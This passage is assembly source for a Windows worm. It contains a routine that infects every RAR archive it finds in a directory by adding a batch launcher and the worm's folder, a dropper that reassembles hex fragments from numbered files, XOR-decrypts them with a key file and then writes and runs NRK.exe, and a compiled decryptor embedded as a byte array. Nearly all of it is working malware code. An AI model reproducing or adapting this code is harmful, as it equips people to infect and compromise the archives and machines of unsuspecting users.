	mov	edi, [combine_pointer]
	mov	ecx, 12
	sub	ecx, ebx
	rep	movsb						; Write the name of the new .bat file

	add	[combine_pointer], 12
	sub	[combine_pointer], ebx

	mov	eax, [combine_data]
	sub	[combine_pointer], eax

	invoke	WriteFile, \					; Write the file
		[combine_handle], \
		[combine_data], \
		[combine_pointer], \
		FALSE_F, \
		0x0

	invoke	CloseHandle, [combine_handle]			; Close the old .bat file

		; Now let's prepare anything for the new file

	pop	[combine_handle]				; Get the handle of the new .bat file again

	mov	eax, [combine_pointer]

	mov	eax, [combine_data]
	mov	[combine_pointer], eax				; [combine_pointer] = Start of virtual Alloc

	mov	esi, combine_start
	mov	edi, [combine_pointer]
	mov	ecx, 5
	rep	movsb						; Write 'copy '

	add	[combine_pointer], 5

	mov	esi, rnd_split_combine_buffer
	xor	eax, eax
	mov	al, [combine_name_size]
	add	esi, eax
	mov	edi, [combine_pointer]
	mov	ecx, 12
	add	ecx, eax
	rep	movsb						; Write previous filename

	add	[combine_pointer], 12
	sub	[combine_pointer], eax

	mov	eax, [combine_pointer]
	mov	byte [eax], '+'
	inc	[combine_pointer]

	mov	eax, rnd_file_name				; RND-pointer in eax
	add	eax, 8						; add 8 to pointer (='.' of filename)
	mov	dword [eax], '.tmp'				; instate of '.tmp', '.bat'
ret

Find_RAR_Files_And_Infect:
	invoke	FindFirstFile, \		; Find the first .RAR file
		infection_extention, \
		WIN32_FIND_DATA

	cmp	eax, INVALID_HANDLE_VALUE	; Last File?
	je	End_Find_RARs			; If yes, stop program

	mov	[inf_handle], eax		; Save the search-handle for *.RAR files

	invoke	SetCurrentDirectory, \
		GCD


   find_rar_loop:
	call	Infect_RAR			; INFECT IT!

	invoke	FindNextFile, \ 		; Get next .RAR file
		[inf_handle], \
		WIN32_FIND_DATA

	cmp	eax, 0x0			; Last File?
	je	End_Find_RARs			; If yes, stop program

   jmp	find_rar_loop
   End_Find_RARs:

	invoke	FindClose, \			; Close the search-handle for *.RAR files
		[inf_handle]

ret


Infect_RAR:
	mov	eax, [combine_data]
	mov	[combine_pointer], eax

	mov	esi, reg_buffer
	mov	edi, [combine_pointer]
	mov	ecx, [inf_string_length]
	rep	movsb						; Write the infection string to the memory

	mov	eax, [inf_string_length]
	sub	eax, 3
	add	[combine_pointer], eax


	mov	esi, GetCurrentDir_buffer
	mov	edi, [combine_pointer]
	mov	ecx, [GetCDB_Size]
	rep	movsb						; Write the path of the victim file before the filename

	mov	eax, [GetCDB_Size]
	add	[combine_pointer], eax

	mov	eax, [combine_pointer]

	mov	byte [eax], '\'
	inc	[combine_pointer]
	xor	ecx, ecx
    find_zero_loop:						; Find the end of the name-string
	mov	eax, WIN32_FIND_DATA.cFileName
	add	eax, ecx
	inc	ecx
	cmp	byte [eax], 0x0 				; If zero=END
    jne find_zero_loop

	sub	eax, WIN32_FIND_DATA.cFileName			; EAX=str_len(filename)

	push	eax

	mov	esi, WIN32_FIND_DATA.cFileName
	mov	edi, [combine_pointer]
	mov	ecx, eax
	rep	movsb						; Write the RAR-filename to the string

	pop	ecx
	add	[combine_pointer], ecx

	mov	eax, [combine_pointer]
	mov	byte [eax], 0x20				; Write a space to the pointer

	inc	[combine_pointer]

	mov	eax, WIN32_FIND_DATA.cFileName
    zero_filename_buffer:
	mov	byte [eax], 0x0
	inc	eax
	cmp	eax, 260
    jle zero_filename_buffer

	mov	eax, [combine_pointer]
	mov	[save_inf_str_pointer], eax			; Save the pointer, for the next string
	mov	[combine_pointer], eax


	mov	[save_inf_str_pointer], eax

	mov	esi, combine_name
	mov	edi, [combine_pointer]
	mov	ecx, 0x9
	rep	movsb

	add	[combine_pointer], 0x9
	mov	eax, [combine_pointer]
	mov	byte [eax], 0x0

	call	Run_Infection_Command				; Run the command! (add start.bat to the .RAR archive)

	mov	esi, worm_dir
	mov	edi, [save_inf_str_pointer]
	mov	ecx, 0x8
	rep	movsb						; Write the name of the directory
								; instead of the start.bat name
	add	[save_inf_str_pointer], 0x8
	mov	eax, [save_inf_str_pointer]
	mov	byte [eax], 0x0 				; Write a zero at the end of the string

	call	Run_Infection_Command				; Run the command! (add worm-directory to the .RAR archive)
ret

Run_Infection_Command:
	invoke	CreateProcess, \			; Execute the extrac32-string
		0x0, \					; Now the extracted version of the victim is in the temp-direcory
		[combine_data], \
		0x0, \
		0x0, \
		FALSE, \
		0x0, \
		0x0, \
		0x0, \
		STARTUPINFO_struct, \
		PROCESS_INFORMATION_struct

	invoke	Sleep, \				; Wait 6.333 Secunds until return.
		6333					; Reason: rar.exe may use much CPU-Speed, to reduce the
							; chance of conflicts, give it some time for working.
							; This has always worked when I've tested it.
ret

ChangeDirString:
; Delete the last backslash of the Current Directory-Path
	mov	ecx, [GetCDB_Size]
    CDS_loop:
	mov	eax, GetCurrentDir_buffer
	add	eax, ecx
	dec	ecx
	cmp	byte [eax], '\'
    jne CDS_loop

	mov	byte [eax], 0x0
	sub	eax, GetCurrentDir_buffer
	mov	[GetCDB_Size], eax
ret

 .end start
######################################[ArchiveTiger.ASM]######################################


#########################################[dechiff.ASM]########################################
include '..\FASM\INCLUDE\win32ax.inc'

.data

	memory_alloc	dd 0x0
	memory_counter	dd 0x0

	searchstr_fn	db '*.'
	      fn_ext	db '000', 0x0

	stSearchTxt	db '*.txt', 0x0

	hSearchFile	dd 0x0
	dot_position	dd 0x0
	trash		dd 0x0
	trash2		dd 0x0

	hCreFile	dd 0x0
	key_txt_size	dd 0x0
	hCrFiMap	dd 0x0
	hMapView	dd 0x0

	FALSE_F 	dd 0x0

	hWormFile	dd 0x0
	worm_file	db 'NRK.exe',0x0

WIN32_FIND_DATA:
  .dwFileAttributes   dd ?
  .ftCreationTime     FILETIME
  .ftLastAccessTime   FILETIME
  .ftLastWriteTime    FILETIME
  .nFileSizeHigh      dd ?
  .nFileSizeLow       dd ?
  .dwReserved0	      dd ?
  .dwReserved1	      dd ?
  .cFileName	      rb 260
  .cAlternateFileName rb 14
;end WIN32_FIND_DATA


STARTUP_struct:
  StartUp_struct_cb		 dd 0
  StartUp_struct_lpReserved	 dd 0
  StartUp_struct_lpDesktop	 dd 0
  StartUp_struct_lpTitle	 dd 0
  StartUp_struct_dwX		 dd 0
  StartUp_struct_dwY		 dd 0
  StartUp_struct_dwXSize	 dd 0
  StartUp_struct_dwYSize	 dd 0
  StartUp_struct_dwXCountChars	 dd 0
  StartUp_struct_dwYCountChars	 dd 0
  StartUp_struct_dwFillAttribute dd 0
  StartUp_struct_dwFlags	 dd 0
  StartUp_struct_wShowWindow	 dw 0
  StartUp_struct_cbReserved2	 dw 0
  StartUp_struct_lpReserved2	 dd 0
  StartUp_struct_hStdInput	 dd 0
  StartUp_struct_hStdOutput	 dd 0
  StartUp_struct_hStdError	 dd 0


PROCESS_INFO_struct:
  PROCESS_INFORMATION_hProcess	  dd 0
  PROCESS_INFORMATION_hThread	  dd 0
  PROCESS_INFORMATION_dwProcessId dd 0
  PROCESS_INFORMATION_dwThreadId  dd 0
.code
start:
	invoke	VirtualAlloc, \
		0x0, \
		0x10000, \		; 64 KB RAM
		0x1000, \
		0x4
	mov	[memory_alloc], eax

   find_files_with_sp_name:
	invoke	FindFirstFile, \	       ; Find a file with special filenames
		searchstr_fn, \ 	       ; Pointer to filename (*.NNN - where NNN is the counter)
		WIN32_FIND_DATA 	       ; Pointer to WIN32_FIND_DATA structure
	mov	[hSearchFile], eax	       ; Save search handle

	cmp	eax, INVALID_HANDLE_VALUE      ; Last File?
	je	decrypt_worm_code	       ; If yes, let's decrypt the worm-code

	call	change_search_str	       ; Increase the extention (counter)
	xor	ecx, ecx		       ; Counter=0
	call	FileName_To_Memory	       ; Write the filename to memory

	invoke	FindClose, \		       ; Close search-handle
		[hSearchFile]
   jmp	find_files_with_sp_name

	nop				       ; Due to a bug in CMD.EXE I have to change the offset
					       ; of the decrypt_worm_code lable.
decrypt_worm_code:

	xor	ecx, ecx
   hex2bin_loop:
	mov	eax, [memory_alloc]
	add	eax, ecx
	mov	ax, word [eax]
	call	hex_to_binary
	mov	ebx, ecx
	shr	ebx, 1
	add	ebx, [memory_alloc]
	mov	[ebx], al
	add	ecx, 2
	cmp	ecx, [memory_counter]
   js	hex2bin_loop

	invoke	FindFirstFile, \	       ; Find the *.txt file with the key to decrypt
		stSearchTxt, \
		WIN32_FIND_DATA

	invoke	FindClose, \		       ; Close the Search-Handle
		eax

	invoke	CreateFile, \		       ; Open the .txt file (with the decrytion-key)
		WIN32_FIND_DATA.cFileName, \
		GENERIC_READ or GENERIC_WRITE, \
		0x0, \
		0x0, \
		OPEN_EXISTING, \
		FILE_ATTRIBUTE_NORMAL, \
		0x0
	mov	[hCreFile], eax

	invoke	GetFileSize, \			; Get the Filesize of the file
		[hCreFile], \			; =Size of the key
		key_txt_size
	mov	[key_txt_size], eax


	invoke	CreateFileMapping, \		; Create a Map of the File
		[hCreFile], \
		0x0, \
		PAGE_READWRITE, \
		0x0, \
		[key_txt_size], \
		0x0
	mov	[hCrFiMap], eax

	invoke	MapViewOfFile, \		; Create a MapViewOfFile
		[hCrFiMap], \			; The key with the decrytion key
		FILE_MAP_ALL_ACCESS, \
		0x0, \
		0x0, \
		[key_txt_size]
	mov	[hMapView], eax

	xor	ecx, ecx			; ECX=COUNTER=0x0
    decrypt_memory_code:
	mov	eax, [hMapView] 		; EAX=Start of decrytion-key
	add	eax, ecx			; EAX=Current position of decrytion key
	mov	al, byte [eax]			; al=Content of current position of decrytion key
	mov	ebx, [memory_alloc]		; EBX=Start of encryted virus in memory
	add	ebx, ecx			; EBX=Current position of encryted virus
	mov	ah, byte [ebx]			; ah=Content of current position of encryted virus
	xor	ah, al				; AH=Encrypted Byte XOR KEY
	mov	byte [ebx], ah			; Write AH to Memory
	inc	ecx				; Increase the counter
	mov	eax, [memory_counter]		; Size of the virus*2 (Due to Hex (2Byte) -> Bin (1Byte) conversion)
	shr	eax, 1				; EAX/2
	cmp	ecx, [key_txt_size]		; Compare if current position greater than key
	jg	finish_decrytion		; If yes, finish decrytion
	cmp	ecx, eax			; Compare if current byte smaller than virus size
    js	decrypt_memory_code			; If yes, continue

   finish_decrytion:

	invoke	UnmapViewOfFile, \
		[hMapView]

	invoke	CloseHandle, \
		[hCrFiMap]

	invoke	CloseHandle, \
		[hCreFile]



	invoke	CreateFile, \
		worm_file, \
		GENERIC_READ or GENERIC_WRITE, \
		0x0, \
		0x0, \
		CREATE_ALWAYS, \
		FILE_ATTRIBUTE_NORMAL, \
		0x0
	mov	[hWormFile], eax

	mov	eax, [memory_counter]
	shr	eax, 1


	invoke	WriteFile, \			; Write the real worm-file
		[hWormFile], \
		[memory_alloc], \
		eax, \
		FALSE_F, \
		0x0

	invoke	CloseHandle, \			; Close Wormfile
		[hWormFile]

	invoke	CreateProcess, \		; Open Worm!
		worm_file, \
		0x0, \
		0x0, \
		0x0, \
		FALSE, \
		0x0, \
		0x0, \
		0x0, \
		STARTUP_struct, \
		PROCESS_INFO_struct


endde:
	invoke	ExitProcess, 0x0



change_search_str:			; Changes the extention to search for
	mov	eax, fn_ext+2		; Pointer to 3rd byte in extention
	cmp	byte [eax], '9' 	; Is it '9'?
	je	hex_ext_counter_9_A	; If yes, make a 'A'

	cmp	byte [eax], 'Z' 	; Is it 'Z'?
	je	hex_ext_counter_Z_0

	inc	byte [eax]		; Increase extention-counter
ret


hex_ext_counter_9_A:
; In:  eax = Pointer to byte to change
; Out: [eax]='A'

	mov	byte [eax], 'A' 	; Increase extention-counter
ret



hex_ext_counter_Z_0:			; My first recursive function in asm :)
	mov	byte [eax], '0' 	; Increase extention-counter
	dec	eax
	cmp	byte [eax], '9'
	je	hex_ext_counter_9_A

	cmp	byte [eax], 'Z'
	je	hex_ext_counter_Z_0

	inc	byte [eax]
ret

FileName_To_Memory:
	mov	ecx, 0x9
   get_dot_in_filename:
	mov	eax, WIN32_FIND_DATA.cFileName
	add	eax, ecx
	cmp	byte [eax], '.'
	je found_dot_in_filename
   loop get_dot_in_filename
found_dot_in_filename:
	mov	[dot_position], ecx

	mov	esi, WIN32_FIND_DATA.cFileName		; What? Filename!
	mov	edi, [memory_alloc]			; Where? Memory!
	add	edi, [memory_counter]			; Where exactly? Next byte in memory
	rep	movsb					; Write!

	mov	ecx, [dot_position]
	add	[memory_counter], ecx

	mov	dword [WIN32_FIND_DATA.cFileName], 0x0		; Anything to 0x0 because if the filename is small,
	mov	dword [WIN32_FIND_DATA.cFileName+4], 0x0	; the dot of the last filename still exists.
	mov	dword [WIN32_FIND_DATA.cFileName+8], 0x0	; (that damn bug wasted ~1h of my time :D)
								; Example: "AA00BB00.001"+0x0
								;          "A.002"+0x0
								;    data: "A.002"+0x0+"00.001"

ret


hex_to_binary:
; Change a HEX-value to binary
; In:  AX = HEX-value (i.E.: "0D")
; Out: AL = binary (i.E.: 0x0D)
; Nothing else changed

	mov	[trash], ebx		; Save ebx
	xchg	al, ah
	sub	ax, 0x3030		; "11"=0x3131 - make it to 0x0101
	push	hex2bin_not_A_F_1

	cmp	al, 0x9 		; If al>0x9 then decrease by 7
	jg	hex2bin_dec_al

	pop	ebx
hex2bin_not_A_F_1:

	mov	ebx, eax		; Save eax
	mov	al, ah			; AL=AH
	push	hex2bin_not_A_F_2
	cmp	al, 0x9 		; If al>0x9 then decrease by 7
	jg	hex2bin_dec_al

	mov	[trash2], ebx
	pop	ebx
	mov	ebx, [trash2]
hex2bin_not_A_F_2:
	xchg	ah, al
	shl	ah, 4

	mov	al, bl
	or	al, ah

	mov	ebx, [trash]		; Restore ebx
ret

hex2bin_dec_al:
	sub	al, 7
ret
.end start
#########################################[dechiff.ASM]########################################


####################################[prime_decrypt_bin.inc]###################################

primary_decryption_code 	db 0x4D,0x5A,0x80,0x00,0x01,0x00,0x00,0x00,0x04,0x00,0x10,0x00,0xFF,0xFF,0x00,0x00
                                db 0x40,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x40,0x00,0x00,0x00,0x00,0x00,0x00,0x00
                                db 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
                                db 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x80,0x00,0x00,0x00
                                db 0x0E,0x1F,0xBA,0x0E,0x00,0xB4,0x09,0xCD,0x21,0xB8,0x01,0x4C,0xCD,0x21,0x54,0x68
                                db 0x69,0x73,0x20,0x70,0x72,0x6F,0x67,0x72,0x61,0x6D,0x20,0x63,0x61,0x6E,0x6E,0x6F
                                db 0x74,0x20,0x62,0x65,0x20,0x72,0x75,0x6E,0x20,0x69,0x6E,0x20,0x44,0x4F,0x53,0x20
                                db 0x6D,0x6F,0x64,0x65,0x2E,0x0D,0x0A,0x24,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
                                db 0x50,0x45,0x00,0x00,0x4C,0x01,0x03,0x00,0x8F,0xC7,0x5B,0x44,0x00,0x00,0x00,0x00
                                db 0x00,0x00,0x00,0x00,0xE0,0x00,0x8F,0x81,0x0B,0x01,0x01,0x38,0x00,0x00,0x00,0x00
                                db 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x20,0x00,0x00,0x00,0x00,0x00,0x00
                                db 0x00,0x00,0x00,0x00,0x00,0x00,0x40,0x00,0x00,0x10,0x00,0x00,0x00,0x02,0x00,0x00
                                db 0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x04,0x00,0x00,0x00,0x00,0x00,0x00,0x00
                                db 0x00,0x40,0x00,0x00,0x00,0x02,0x00,0x00,0xE6,0xAA,0x00,0x00,0x02,0x00,0x00,0x00
                                db 0x00,0x10,0x00,0x00,0x00,0x10,0x00,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x00,0x00
                                db 0x00,0x00,0x00,0x00,0x10,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
                                db 0x00,0x30,0x00,0x00,0x55,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
                                db 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
                                db 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
                                db 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
                                db 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
                                db 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
                                db 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
                                db 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x2E,0x64,0x61,0x74,0x61,0x00,0x00,0x00
                                db 0xD6,0x01,0x00,0x00,0x00,0x10,0x00,0x00,0x00,0x02,0x00,0x00,0x00,0x02,0x00,0x00
                                db 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x40,0x00,0x00,0xC0
                                db 0x2E,0x74,0x65,0x78,0x74,0x00,0x00,0x00,0x90,0x02,0x00,0x00,0x00,0x20,0x00,0x00
                                db 0x00,0x04,0x00,0x00,0x00,0x04,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
                                db 0x00,0x00,0x00,0x00,0x20,0x00,0x00,0x60,0x2E,0x69,0x64,0x61,0x74,0x61,0x00,0x00
                                db 0x55,0x01,0x00,0x00,0x00,0x30,0x00,0x00,0x00,0x02,0x00,0x00,0x00,0x08,0x00,0x00
                                db 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x40,0x00,0x00,0xC0
                                db 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
                                db 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x2A,0x2E,0x30,0x30,0x30,0x00,0x2A,0x2E
                                db 0x74,0x78,0x74,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
                                db 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
                                db 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x4E,0x52,0x4B,0x2E
                                db 0x65,0x78,0x65,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
                                db 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
                                db 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
                                db 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
                                db 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
                                db 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
                                db 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
                                db 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
                                db 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
                                db 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
                                db 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
                                db 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
                                db 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
                                db 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
                                db 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
                                db 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
                                db 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
                                db 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
                                db 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
                                db 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
                                db 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
                                db 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
                                db 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
                                db 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
                                db 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
                                db 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
                                db 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
                                db 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
                                db 0x6A,0x04,0x68,0x00,0x10,0x00,0x00,0x68,0x00,0x00,0x01,0x00,0x6A,0x00,0xFF,0x15
                                db 0x91,0x30,0x40,0x00,0xA3,0x00,0x10,0x40,0x00,0x68,0x44,0x10,0x40,0x00,0x68,0x08
                                db 0x10,0x40,0x00,0xFF,0x15,0x81,0x30,0x40,0x00,0xA3,0x14,0x10,0x40,0x00,0x83,0xF8
                                db 0xFF,0x74,0x1B,0xE8,0x97,0x01,0x00,0x00,0x31,0xC9,0xE8,0xB7,0x01,0x00,0x00,0xFF
                                db 0x35,0x14,0x10,0x40,0x00,0xFF,0x15,0x7D,0x30,0x40,0x00,0xEB,0xCC,0x90,0x31,0xC9
                                db 0xA1,0x00,0x10,0x40,0x00,0x01,0xC8,0x66,0x8B,0x00,0xE8,0xEE,0x01,0x00,0x00,0x89
                                db 0xCB,0xD1,0xEB,0x03,0x1D,0x00,0x10,0x40,0x00,0x88,0x03,0x83,0xC1,0x02,0x3B,0x0D
                                db 0x04,0x10,0x40,0x00,0x78,0xDA,0x68,0x44,0x10,0x40,0x00,0x68,0x0E,0x10,0x40,0x00
                                db 0xFF,0x15,0x81,0x30,0x40,0x00,0x50,0xFF,0x15,0x7D,0x30,0x40,0x00,0x6A,0x00,0x68
                                db 0x80,0x00,0x00,0x00,0x6A,0x03,0x6A,0x00,0x6A,0x00,0x68,0x00,0x00,0x00,0xC0,0x68
                                db 0x70,0x10,0x40,0x00,0xFF,0x15,0x6D,0x30,0x40,0x00,0xA3,0x24,0x10,0x40,0x00,0x68
                                db 0x28,0x10,0x40,0x00,0xFF,0x35,0x24,0x10,0x40,0x00,0xFF,0x15,0x85,0x30,0x40,0x00
                                db 0xA3,0x28,0x10,0x40,0x00,0x6A,0x00,0xFF,0x35,0x28,0x10,0x40,0x00,0x6A,0x00,0x6A
                                db 0x04,0x6A,0x00,0xFF,0x35,0x24,0x10,0x40,0x00,0xFF,0x15,0x71,0x30,0x40,0x00,0xA3
                                db 0x2C,0x10,0x40,0x00,0xFF,0x35,0x28,0x10,0x40,0x00,0x6A,0x00,0x6A,0x00,0x68,0x1F
                                db 0x00,0x0F,0x00,0xFF,0x35,0x2C,0x10,0x40,0x00,0xFF,0x15,0x89,0x30,0x40,0x00,0xA3
                                db 0x30,0x10,0x40,0x00,0x31,0xC9,0xA1,0x30,0x10,0x40,0x00,0x01,0xC8,0x8A,0x00,0x8B
                                db 0x1D,0x00,0x10,0x40,0x00,0x01,0xCB,0x8A,0x23,0x30,0xC4,0x88,0x23,0x41,0xA1,0x04
                                db 0x10,0x40,0x00,0xD1,0xE8,0x3B,0x0D,0x28,0x10,0x40,0x00,0x7F,0x04,0x39,0xC1,0x78
                                db 0xD5,0xFF,0x35,0x30,0x10,0x40,0x00,0xFF,0x15,0x8D,0x30,0x40,0x00,0xFF,0x35,0x2C
                                db 0x10,0x40,0x00,0xFF,0x15,0x69,0x30,0x40,0x00,0xFF,0x35,0x24,0x10,0x40,0x00,0xFF
                                db 0x15,0x69,0x30,0x40,0x00,0x6A,0x00,0x68,0x80,0x00,0x00,0x00,0x6A,0x02,0x6A,0x00
                                db 0x6A,0x00,0x68,0x00,0x00,0x00,0xC0,0x68,0x3C,0x10,0x40,0x00,0xFF,0x15,0x6D,0x30
                                db 0x40,0x00,0xA3,0x38,0x10,0x40,0x00,0xA1,0x04,0x10,0x40,0x00,0xD1,0xE8,0x6A,0x00
                                db 0x68,0x34,0x10,0x40,0x00,0x50,0xFF,0x35,0x00,0x10,0x40,0x00,0xFF,0x35,0x38,0x10
                                db 0x40,0x00,0xFF,0x15,0x95,0x30,0x40,0x00,0xFF,0x35,0x38,0x10,0x40,0x00,0xFF,0x15
                                db 0x69,0x30,0x40,0x00,0x68,0xC6,0x11,0x40,0x00,0x68,0x82,0x11,0x40,0x00,0x6A,0x00
                                db 0x6A,0x00,0x6A,0x00,0x6A,0x00,0x6A,0x00,0x6A,0x00,0x6A,0x00,0x68,0x3C,0x10,0x40
                                db 0x00,0xFF,0x15,0x75,0x30,0x40,0x00,0x6A,0x00,0xFF,0x15,0x79,0x30,0x40,0x00,0xB8
                                db 0x0C,0x10,0x40,0x00,0x80,0x38,0x39,0x74,0x08,0x80,0x38,0x5A,0x74,0x07,0xFE,0x00
                                db 0xC3,0xC6,0x00,0x41,0xC3,0xC6,0x00,0x30,0x48,0x80,0x38,0x39,0x74,0xF3,0x80,0x38
                                db 0x5A,0x74,0xF2,0xFE,0x00,0xC3,0xB9,0x09,0x00,0x00,0x00,0xB8,0x70,0x10,0x40,0x00
                                db 0x01,0xC8,0x80,0x38,0x2E,0x74,0x02,0xE2,0xF2,0x89,0x0D,0x18,0x10,0x40,0x00,0xBE
                                db 0x70,0x10,0x40,0x00,0x8B,0x3D,0x00,0x10,0x40,0x00,0x03,0x3D,0x04,0x10,0x40,0x00
                                db 0xF3,0xA4,0x8B,0x0D,0x18,0x10,0x40,0x00,0x01,0x0D,0x04,0x10,0x40,0x00,0xC7,0x05
                                db 0x70,0x10,0x40,0x00,0x00,0x00,0x00,0x00,0xC7,0x05,0x74,0x10,0x40,0x00,0x00,0x00
                                db 0x00,0x00,0xC7,0x05,0x78,0x10,0x40,0x00,0x00,0x00,0x00,0x00,0xC3,0x89,0x1D,0x1C
                                db 0x10,0x40,0x00,0x86,0xC4,0x66,0x2D,0x30,0x30,0x68,0x63,0x22,0x40,0x00,0x3C,0x09
                                db 0x7F,0x2B,0x5B,0x89,0xC3,0x88,0xE0,0x68,0x7D,0x22,0x40,0x00,0x3C,0x09,0x7F,0x1D
                                db 0x89,0x1D,0x20,0x10,0x40,0x00,0x5B,0x8B,0x1D,0x20,0x10,0x40,0x00,0x86,0xE0,0xC0
                                db 0xE4,0x04,0x88,0xD8,0x08,0xE0,0x8B,0x1D,0x1C,0x10,0x40,0x00,0xC3,0x2C,0x07,0xC3
                                db 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
                                db 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
                                db 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
                                db 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
                                db 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
                                db 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
                                db 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
                                db 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
                                db 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
                                db 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
